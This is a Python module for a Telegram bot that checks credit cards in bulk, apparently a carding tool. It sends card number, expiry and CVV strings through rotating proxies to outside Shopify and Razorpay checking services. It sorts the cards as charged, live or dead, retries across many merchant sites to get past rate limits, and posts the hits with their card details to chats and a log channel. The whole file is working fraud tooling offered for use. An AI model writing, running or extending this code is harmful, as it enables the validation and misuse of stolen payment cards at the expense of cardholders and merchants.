import asyncio
import aiohttp
import json
import random
import time
import os
from datetime import datetime
from utils import extract_cc, get_bin_info, get_indian_time, premium_emoji, load_proxies, load_sites, load_razorpay_sites
from config import SHOPIFY_APIS, RAZORPAY_API_BASE, PREMIUM_EMOJI_IDS, LOGS_CHANNEL_ID, APPROVED_GROUP_ID
from db import get_user
import aiofiles

# Active sessions for progress tracking
active_sessions = {}

# GIF management
GIFS_FILE = "gifs.json"
def load_gifs():
    if not os.path.exists(GIFS_FILE):
        default = {"charged": [], "approved": []}
        with open(GIFS_FILE, "w") as f:
            json.dump(default, f)
        return default
    with open(GIFS_FILE, "r") as f:
        return json.load(f)

def add_gif(gif_type, url):
    gifs = load_gifs()
    if gif_type in gifs:
        if url not in gifs[gif_type]:
            gifs[gif_type].append(url)
            with open(GIFS_FILE, "w") as f:
                json.dump(gifs, f)
            return True
    return False

def remove_gif(gif_type, url):
    gifs = load_gifs()
    if gif_type in gifs and url in gifs[gif_type]:
        gifs[gif_type].remove(url)
        with open(GIFS_FILE, "w") as f:
            json.dump(gifs, f)
        return True
    return False

def get_random_gif(gif_type):
    gifs = load_gifs()
    if gif_type in gifs and gifs[gif_type]:
        return random.choice(gifs[gif_type])
    return None

# Core check functions (adapted from original)
def is_dead_site_error(msg):
    if not msg: return True
    msg = str(msg).lower()
    dead = ('receipt id is empty', 'handle is empty', 'product id is empty',
            'tax amount is empty', 'payment method identifier is empty',
            'invalid url', 'error in 1st req', 'error in 1 req',
            'cloudflare', 'connection failed', 'timed out',
            'access denied', 'tlsv1 alert', 'ssl routines',
            'could not resolve', 'domain name not found',
            'name or service not known', 'openssl ssl_connect',
            'empty reply from server', 'httperror504', 'http error',
            'timeout', 'unreachable', 'ssl error',
            '502', '503', '504', 'bad gateway', 'service unavailable',
            'gateway timeout', 'network error', 'connection reset',
            'failed to detect product', 'failed to create checkout',
            'failed to tokenize card', 'failed to get proposal data',
            'submit rejected', 'handle error', 'http 404',
            'delivery_delivery_line_detail_changed', 'delivery_address2_required',
            'url rejected', 'malformed input', 'amount_too_small',
            'site dead', 'captcha_required', 'captcha required', 'site errors',
            'all products sold out', 'no_session_token', 'tokenize_fail',
            'merchandise_expected_price_mismatch', 'payments_credit_card_generic',
            'payments_payment_flexibility_terms_id_mismatch',
            'failed to get session token', 'no valid payment method found',
            'unable to get payment token', 'cart failed with status 503',
            'invalid json response', 'expecting value', 'site not supported',
            'no valid products', 'product price too high', 'site requires login',
            'proxy error', 'status: 4', 'site dead', 'error processing card',
            'generic_error', 'validation_custom', '429', 'rate limit',
            'too many requests')
    return any(x in msg for x in dead)

async def check_card(card, site, proxy):
    try:
        parts = card.split('|')
        if len(parts) != 4:
            return {'status': 'Site Error', 'message': 'Invalid card format', 'card': card, 'site': site, 'gateway': 'Unknown', 'price': '-', 'retry': True}
        if not site.startswith("http"):
            site = f"https://{site}"
        api_url = random.choice(SHOPIFY_APIS)
        url = f"{api_url}?site={site}&cc={card}&proxy={proxy}"
        timeout = aiohttp.ClientTimeout(total=30)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(url) as resp:
                raw = await resp.json(content_type=None)
        response_msg = str(raw.get('Response', '')).strip()
        price = raw.get('Price', '-')
        gate = raw.get('Gateway', raw.get('Gate', '𝘼𝙪𝙩𝙤 𝙎𝙝𝙤𝙥𝙞𝙛𝙮'))
        status = raw.get('Status', '')
        api_status = raw.get('Status', False)
        response_lower = response_msg.lower()

        # Check for site errors
        if is_dead_site_error(response_lower) or any(x in response_lower for x in ('request timeout', 'timeout', 'connection failed')):
            return {'status': 'Site Error', 'message': response_msg[:150] or 'Site Error', 'card': card, 'retry': True, 'gateway': gate, 'price': price, 'site': site}

        # Price check
        if "razorpay" not in gate.lower() and "rz" not in gate.lower():
            try:
                price_value = float(str(price).replace("$", "").replace("₹", "").strip())
                if price_value > 30:
                    return {'status': 'Site Error', 'message': f"Price ${price_value} > $30", 'card': card, 'retry': True, 'gateway': gate, 'price': price, 'site': site}
            except:
                pass

        if status == "Charged" or any(x in response_lower for x in ('charged', 'order completed', 'order_placed', 'order_paid', 'insufficient_funds', 'thank you', 'payment successful')):
            return {'status': 'Charged', 'message': response_msg[:150] or 'Charged', 'card': card, 'site': site, 'gateway': gate, 'price': price, 'retry': False}
        if status == 'Approved' or any(x in response_lower for x in ('otp_required', 'approved', 'success', 'invalid_cvv', 'incorrect_cvv')):
            return {'status': 'Approved', 'message': response_msg[:150] or 'Approved', 'card': card, 'site': site, 'gateway': gate, 'price': price, 'retry': False}
        if "card_declined" in response_lower or "declined" in response_lower:
            return {'status': 'Dead', 'message': response_msg[:150] or 'CARD_DECLINED', 'card': card, 'site': site, 'gateway': gate, 'price': price, 'retry': False}
        if not api_status:
            return {'status': 'Site Error', 'message': response_msg[:150] or 'API Status False', 'card': card, 'retry': True, 'gateway': gate, 'price': price, 'site': site}
        return {'status': 'Site Error', 'message': response_msg[:150] or 'Unknown Error', 'card': card, 'retry': True, 'gateway': gate, 'price': price, 'site': site}
    except asyncio.TimeoutError:
        return {'status': 'Site Error', 'message': 'Request timeout', 'card': card, 'retry': True, 'gateway': '𝘼𝙪𝙩𝙤 𝙎𝙝𝙤𝙥𝙞𝙛𝙮', 'price': '-', 'site': site}
    except json.JSONDecodeError:
        return {'status': 'Site Error', 'message': 'Invalid JSON', 'card': card, 'retry': True, 'gateway': '𝘼𝙪𝙩𝙤 𝙎𝙝𝙤𝙥𝙞𝙛𝙮', 'price': '-', 'site': site}
    except Exception as e:
        return {'status': 'Site Error', 'message': f'Error: {str(e)[:80]}', 'card': card, 'retry': True, 'gateway': '𝘼𝙪𝙩𝙤 𝙎𝙝𝙤𝙥𝙞𝙛𝙮', 'price': '-', 'site': site}

async def check_card_with_retry(card, sites, proxies, max_retries=15):
    if not sites:
        return {'status': 'Dead', 'message': 'No sites available', 'card': card, 'gateway': '𝘼𝙪𝙩𝙤 𝙎𝙝𝙤𝙥𝙞𝙛𝙮', 'price': '-', 'site': None}
    if not proxies:
        return {'status': 'Dead', 'message': 'No proxies available', 'card': card, 'gateway': '𝘼𝙪𝙩𝙤 𝙎𝙝𝙤𝙥𝙞𝙛𝙮', 'price': '-', 'site': None}
    used_sites = set()
    used_proxies = set()
    last_error = None
    for attempt in range(max_retries):
        avail_sites = [s for s in sites if s not in used_sites]
        if not avail_sites:
            break
        site = random.choice(avail_sites)
        used_sites.add(site)
        avail_proxies = [p for p in proxies if p not in used_proxies]
        if not avail_proxies:
            break
        proxy = random.choice(avail_proxies)
        used_proxies.add(proxy)
        result = await check_card(card, site, proxy)
        result['site'] = site
        if result.get('retry', False):
            last_error = result
            await asyncio.sleep(0.5)
            continue
        return result
    return {'status': 'Dead', 'message': last_error.get('message', 'All attempts failed') if last_error else 'All attempts failed', 'card': card, 'gateway': '𝘼𝙪𝙩𝙤 𝙎𝙝𝙤𝙥𝙞𝙛𝙮', 'price': '-', 'site': None}

async def check_card_razorpay(card, proxy, amount=1):
    try:
        parts = card.split('|')
        if len(parts) != 4:
            return {'status': 'Invalid Format', 'message': 'Invalid card format', 'card': card, 'gateway': 'Razorpay', 'price': '-'}
        site = "https://pages.razorpay.com/BusinessGarh?fbclid=PAAaYBPBDRDVaPZMu7kXaq1a2mNOIiXxEJ1usxIxxdbAJYt3q75QWhHXFZeh8_aem_AXQuIpg6pqBI2mXplIaDgYU0ztY4jF0C97qV1RPZF6WzfWeZy93K9u0Gv1wbTWYDpRs%20Ye%20lagan%20he%20to/pl_Eg24W0HLznkELl/view"
        base_url = f"{RAZORPAY_API_BASE}?Key=aiojames&Site={site}&amount={amount}&cc={card}&proxy={proxy}"
        timeout = aiohttp.ClientTimeout(total=30)
        for attempt in range(60):
            try:
                async with aiohttp.ClientSession(timeout=timeout) as session:
                    async with session.get(base_url, ssl=False) as resp:
                        raw_text = await resp.text()
                        raw_text = raw_text.strip()
                if not raw_text or len(raw_text) < 5:
                    if attempt < 59:
                        await asyncio.sleep(0.8 + attempt * 0.15)
                        continue
                    return {'status': 'Dead', 'message': 'Empty Response', 'card': card, 'gateway': 'Razorpay', 'price': '-'}
                if raw_text.startswith('<') or not raw_text.startswith('{'):
                    if attempt < 59:
                        await asyncio.sleep(1.2 + attempt * 0.2)
                        continue
                    return {'status': 'Dead', 'message': f'Bad Response: {raw_text[:80]}', 'card': card, 'gateway': 'Razorpay', 'price': '-'}
                try:
                    raw = json.loads(raw_text)
                except:
                    if attempt < 59:
                        await asyncio.sleep(1.0 + attempt * 0.1)
                        continue
                    return {'status': 'Dead', 'message': f'Invalid JSON: {raw_text[:80]}', 'card': card, 'gateway': 'Razorpay', 'price': '-'}
                response_msg = str(raw.get('response', raw.get('Response', raw.get('message', '')))).strip()
                price = str(raw.get('Price', amount))
                status_str = str(raw.get('status', raw.get('success', ''))).lower()
                if any(x in status_str for x in ['charged', 'success', 'true']) or any(x in response_msg.lower() for x in ['charged','order completed','order_placed','order_paid','insufficient_funds','thank you','payment successful']):
                    return {'status':'Charged','message':response_msg,'card':card,'site':site,'gateway':'Razorpay','price':price}
                elif any(x in status_str for x in ['approved', 'success']) or 'otp' in response_msg.lower():
                    return {'status': 'Approved', 'message': response_msg, 'card': card, 'site': site, 'gateway': 'Razorpay', 'price': price}
                else:
                    return {'status': 'Dead', 'message': response_msg or 'DECLINED', 'card': card, 'site': site, 'gateway': 'Razorpay', 'price': price}
            except asyncio.TimeoutError:
                if attempt < 59:
                    await asyncio.sleep(2.0 + attempt * 0.2)
                    continue
                return {'status': 'Dead', 'message': 'Timeout', 'card': card, 'gateway': 'Razorpay', 'price': '-'}
            except Exception as e:
                if attempt < 59:
                    await asyncio.sleep(1.3 + attempt * 0.18)
                    continue
                return {'status': 'Dead', 'message': f'Error: {str(e)[:120]}', 'card': card, 'gateway': 'Razorpay', 'price': '-'}
        return {'status': 'Dead', 'message': 'Max retries exceeded', 'card': card, 'gateway': 'Razorpay', 'price': '-'}
    except Exception as e:
        return {'status': 'Dead', 'message': f'Outer Error: {str(e)[:100]}', 'card': card, 'gateway': 'Razorpay', 'price': '-'}

# Progress update and final results
async def update_progress(user_id, message_id, results, current_attempt_count, first_name="User", is_razorpay=False):
    current_time = get_indian_time()
    charged = len(results.get('charged', []))
    approved = len(results.get('approved', []))
    dead = len(results.get('dead', []))
    errors = results.get('errors', 0)
    total = results.get('total', 0)
    checked = current_attempt_count
    gateway = "𝙍𝘼𝙕𝙊𝙍𝙋𝘼𝙔" if is_razorpay else "𝙎𝙃𝙊𝙋𝙄𝙁𝙔"

    progress = int((checked / total) * 20) if total > 0 else 0
    bar = "█" * progress + "▒" * (20 - progress)

    text = f"""<b>⚡ 𝘿𝙀𝙑 𝙓 𝙎𝙃𝙊𝙋𝙄𝙁𝙔 💎 ⚡</b>
━━━━━━━━━━━━━━━━━━━━
<b>💠 𝗚𝗔𝗧𝗘𝗪𝗔𝗬 ➜</b> {gateway}
<b>🔄 𝗦𝗧𝗔𝗧𝗨𝗦 ➜</b> 𝗖𝗛𝗘𝗖𝗞𝗜𝗡𝗚...
━━━━━━━━━━━━━━━━━━━━
<code>{bar}</code> <b>{progress*5}%</b>
━━━━━━━━━━━━━━━━━━━━
<b>✅ 𝗖𝗛𝗘𝗖𝗞𝗘𝗗 ➜</b> <code>{checked}/{total}</code>
<b>🔥 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 ➜</b> <code>{approved}</code>
<b>💎 𝗖𝗛𝗔𝗥𝗚𝗘𝗗 ➜</b> <code>{charged}</code>
<b>❌ 𝗗𝗘𝗔𝗗 ➜</b> <code>{dead}</code>
<b>⚠️ 𝗘𝗥𝗥𝗢𝗥𝗦 ➜</b> <code>{errors}</code>
<b>⏳ 𝗧𝗜𝗠𝗘 ➜</b> <code>{current_time}</code>  
━━━━━━━━━━━━━━━━━━━━
<b>👑 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ➜</b> <a href="tg://user?id={user_id}">{first_name}</a>
<b>🦄 𝗕𝗼𝘁 𝗕𝘆 ➜</b> <a href="tg://user?id={OWNER_ID}">⏤͟͟✧┊𓆩Dɢ Sʜᴀᴜʀʏᴀ𓆪 𖤍</a>"""
    return text

async def send_final_results(chat_id, results, bot):
    if not results or not isinstance(results, dict):
        results = {'charged': [], 'approved': [], 'dead': [], 'error_cards': [], 'errors': 0, 'total': 0, 'start_time': time.time()}
    if 'start_time' not in results:
        results['start_time'] = time.time()
    error_count = len(results.get('error_cards', []))
    if 'total' not in results:
        results['total'] = len(results.get('charged', [])) + len(results.get('approved', [])) + len(results.get('dead', [])) + error_count

    elapsed = int(time.time() - results['start_time'])
    hours = elapsed // 3600
    minutes = (elapsed % 3600) // 60
    seconds = elapsed % 60

    hits_text = ""
    if results.get('charged'):
        for r in results['charged'][:5]:
            hits_text += f"✅ <code>{r['card']}</code>\n"
    if results.get('approved'):
        for r in results['approved'][:5]:
            hits_text += f"🔥 <code>{r['card']}</code>\n"
    if not hits_text:
        hits_text = "No hits found"

    gateway = "𝘼𝙪𝙩𝙤 𝙎𝙝𝙤𝙥𝙞𝙛𝙮"
    price = "0.00"
    if results.get("charged"):
        gateway = results["charged"][0].get("gateway", "𝘼𝙪𝙩𝙤 𝙎𝙝𝙤𝙥𝙞𝙛𝙮")
        price = results["charged"][0].get("price", "-")
    elif results.get("approved"):
        gateway = results["approved"][0].get("gateway", "𝘼𝙪𝙩𝙤 𝙎𝙝𝙤𝙥𝙞𝙛𝙮")
        price = results["approved"][0].get("price", "-")

    summary = f"""<b>⚡💳 𝘼𝙪𝙩𝙤 𝙎𝙝𝙤𝙥𝙞𝙛𝙮 💳⚡</b>
━━━━━━━━━━━━━━━━━━
<b>⚡💠 Results</b>
<blockquote>💳 Total: {results.get('total', 0)} | ✅ Charged: {len(results.get('charged', []))} | 🔥 Live: {len(results.get('approved', []))} | ❌ Dead: {len(results.get('dead', []))} | ⚠️ Error: {error_count}</blockquote>
<blockquote>🌐 Gateway ↬ 🔥 {gateway} | 💰 {price}</blockquote> 
<blockquote>⏱️ Time: {hours}h {minutes}m {seconds}s</blockquote>
━━━━━━━━━━━━━━━━━━
<b>🎯💠 Hits</b>
<blockquote>{hits_text}</blockquote>
━━━━━━━━━━━━━━━━━━
🦄 <b>Bot By:</b> <a href="tg://user?id={OWNER_ID}">⏤͟͟✧┊𓆩Dɢ Sʜᴀᴜʀʏᴀ𓆪 𖤍</a>"""

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"Checker_Result_{chat_id}_{timestamp}.txt"

    async with aiofiles.open(filename, 'w') as f:
        await f.write("=" * 70 + "\n")
        await f.write("⚡💳 CC CHECKER RESULTS 💳⚡\n")
        await f.write("Format: CC | Gateway | Price | Message | Site\n")
        await f.write("=" * 70 + "\n\n")
        await f.write(f"✅ CHARGED ({len(results.get('charged', []))}):\n")
        await f.write("-" * 70 + "\n")
        for r in results.get('charged', []):
            await f.write(f"{r.get('card', '')} | {r.get('gateway', 'Auto Shopify')} | {r.get('price', '-')} | {str(r.get('message', ''))[:100]} | {r.get('site', '')}\n")
        await f.write("\n")
        await f.write(f"🔥 APPROVED ({len(results.get('approved', []))}):\n")
        await f.write("-" * 70 + "\n")
        for r in results.get('approved', []):
            await f.write(f"{r.get('card', '')} | {r.get('gateway', 'Auto Shopify')} | {r.get('price', '-')} | {str(r.get('message', ''))[:100]} | {r.get('site', '')}\n")
        await f.write("\n")
        await f.write(f"❌ DEAD ({len(results.get('dead', []))}):\n")
        await f.write("-" * 70 + "\n")
        for r in results.get('dead', []):
            await f.write(f"{r.get('card', '')} | {r.get('gateway', '')} | {r.get('price', '-')} | {str(r.get('message', ''))[:100]} | {r.get('site', '')}\n")
        error_cards = results.get('error_cards', [])
        if error_cards:
            await f.write(f"\n⚠️ ERRORS ({len(error_cards)}):\n")
            await f.write("-" * 70 + "\n")
            for r in error_cards:
                await f.write(f"{r.get('card', '')} | {r.get('gateway', '')} | {r.get('price', '-')} | {str(r.get('message', ''))[:100]} | {r.get('site', '')}\n")

    try:
        await bot.send_message(chat_id, premium_emoji(summary), file=filename, parse_mode="html")
    except Exception as e:
        print(f"Send final error: {e}")
        await bot.send_message(chat_id, premium_emoji(summary), parse_mode="html")
    try:
        os.remove(filename)
    except:
        pass

    # Send GIF if any hits
    if results.get('charged'):
        gif_url = get_random_gif("charged")
        if gif_url:
            try:
                await bot.send_message(chat_id, gif_url)
            except:
                pass
    elif results.get('approved'):
        gif_url = get_random_gif("approved")
        if gif_url:
            try:
                await bot.send_message(chat_id, gif_url)
            except:
                pass

# Log hit to group
async def log_hit_to_group(user_id, result, hit_type, username, bot):
    try:
        if result['status'] not in ('Charged', 'Approved'):
            return
        gateway = result.get('gateway', 'Unknown')
        price = result.get('price', 'Real')
        card_full = result.get('card', '')
        if '|' in card_full:
            card_num = card_full.split('|')[0]
            card_hidden = card_num[:6] + "******" + card_num[-4:] if len(card_num) >= 10 else card_num[:6] + "****"
        else:
            card_hidden = "****"
        is_rz = "razorpay" in gateway.lower()
        if result['status'] == 'Charged':
            status_text = "Charged 💎"
            emoji = "💎"
        else:
            status_text = "Approved 🔥"
            emoji = "🔥"
        if is_rz:
            message = f"""<b>✅ 𝐑𝐀𝐙𝐎𝐑𝐏𝐀𝐘 𝐇𝐈𝐓 ↬ {status_text}</b>
━━━━━━━━━━━━━━━━━
<b>💠 Gateway ↬</b> {gateway}
<b>💳 CC ↬</b> <code>{card_hidden}</code>
<b>💎 Response ↬</b> {result.get('message','')[:120]}
<b>💰 Price ↬</b> ₹{price}
━━━━━━━━━━━━━━━━━
<b>👤 User ↬</b> <a href="tg://user?id={user_id}">{username}</a>
<b>🦄 Hit From ↬</b> @TGidFreeebot"""
        else:
            message = f"""<b>✅ 𝑯𝑰𝑻 𝑫𝑬𝑻𝑬𝑪𝑻𝑬𝑫 ↬ {status_text}</b>
━━━━━━━━━━━━━━━━━
<b>💠 Gateway ↬</b> {gateway}
<b>💳 CC ↬</b> <code>{card_hidden}</code>
<b>💎 Response ↬</b> {result.get('message','')[:120]}
<b>💰 Price ↬</b> ${price}
━━━━━━━━━━━━━━━━━
<b>👤 User ↬</b> <a href="tg://user?id={user_id}">{username}</a>
<b>🦄 Hit From ↬</b> @TGidFreeebot"""
        # Send to log channel (use environment variable)
        from config import LOGS_CHANNEL_ID
        if LOGS_CHANNEL_ID:
            try:
                await bot.send_message(LOGS_CHANNEL_ID, premium_emoji(message), parse_mode='html')
            except:
                pass
    except Exception as e:
        print(f"Log hit error: {e}")
